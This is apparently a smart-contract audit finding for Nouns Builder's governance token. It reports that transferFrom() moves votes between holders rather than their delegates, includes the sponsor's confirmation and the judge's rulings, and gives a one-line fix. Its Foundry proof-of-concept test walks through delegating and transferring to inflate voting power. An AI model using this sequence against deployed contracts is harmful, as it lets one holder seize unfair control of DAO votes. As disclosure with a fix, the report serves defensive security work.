[H-05]_transferFrom()can be used to indefinitely increase voting power
Submitted by Soosh, also found by Ch_301, davidbrai, and PwnPatrol
It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.
Explanation
The_transferFrom()does not move delegates from the src’s delegates to the destination’s delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)
Code POC
// Insert this test case into Token.t.sol// Run: forge test --match-contract Token -vvimport"forge-std/console.sol";...functiontestIncreaseVotePower()public{deployMock();addressvoter1;addressvoter2;uint256voter1PK;uint256voter2PK;// Voter with 1 NFT voting powervoter1PK=0xABC;voter1=vm.addr(voter1PK);vm.deal(voter1,1ether);// Second account created by same votervoter2PK=0xABD;voter2=vm.addr(voter2PK);// Giving voter1 their 1 NFTvm.prank(founder);auction.unpause();vm.prank(voter1);auction.createBid{ value:0.420ether}(2);vm.warp(auctionParams.duration+1seconds);auction.settleCurrentAndCreateNewAuction();// Start Exploitconsole.log("Initial Votes");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));vm.prank(voter1);token.delegate(voter2);console.log("After Delegating Votes, voter1 -> delegate(voter2)");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));vm.prank(voter1);token.transferFrom(voter1,voter2,2);console.log("After Token transfer, voter1 -transferFrom()-> voter2");console.log("voter1 votes: ",token.getVotes(voter1));console.log("voter2 votes: ",token.getVotes(voter2));vm.prank(voter2);token.delegate(voter2);console.log("After Delegating Votes, voter2 -> delegate(voter2)");console.log("voter1: ",token.getVotes(voter1));console.log("voter2: ",token.getVotes(voter2));}
Expected Output:
[PASS]testVoteDoublePower() (gas:3544946)Logs:Initial Votesvoter1:  1voter2:  0After Delegating Votes, voter1 -> delegate(voter2)voter1:  1voter2:  1After Token transfer, voter1 -transferFrom()-> voter2voter1 votes:  0voter2 votes:  2After Delegating Votes, voter2 -> delegate(voter2)voter1:  0voter2:  3
Recommended Mitigation Steps
Looking atOpenZeppelin’s ERC721Voteswhich I believe the team took reference from, it states:
* Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost* on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of* the votes in governance decisions, or they can delegate to themselves to be their own representative.
The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.
I believe the issue is here on thisline
// Transfer 1 vote from the sender to the recipient_moveDelegateVotes(_from,_to,1);
Where it should move from the delegate of_fromto the delegate of_to. Suggested FIx:
_moveDelegateVotes(delegation[_from],delegation[_to],1);
iainnash (Nouns Builder) confirmed and commented:
Would agree w/ High risk.
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to an incorrect handling of delegation, a Token Holder can delegate their voting power without losing it, allowing for an exploit that allows them to reach infinite voting power.I believe that some of the problems with Delegation shown via this contest can be traced down to this quote from theOZ DocumentationTokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of the votes in governance decisions, or they can delegate to themselves to be their own representative.Remediation of this specific issue can be done by following the warden advice, and using the Test Case to verify the exploit has been patched, additionally, further thinking into how delegation should behave will be necessary to ensure the system is patched to safety
Alex the Entreprenerd (judge) commented:
In contrast toissue 469(Unsafe Underflow) andissue 413(Self Delegation for doubling of votes), this report is showing how, due to an incorrect accounting, a user can repeatedly transfer and delegate to achieve infinite voting power.While the outcome of all 3 is increased voting power, I believe the uniqueness of the attack is in exploiting a different aspect of the code.Remediation should account for all 3 exploits, and I believe, because of the uniqueness of the attack, that this is a distinct report vs the previously mentioned.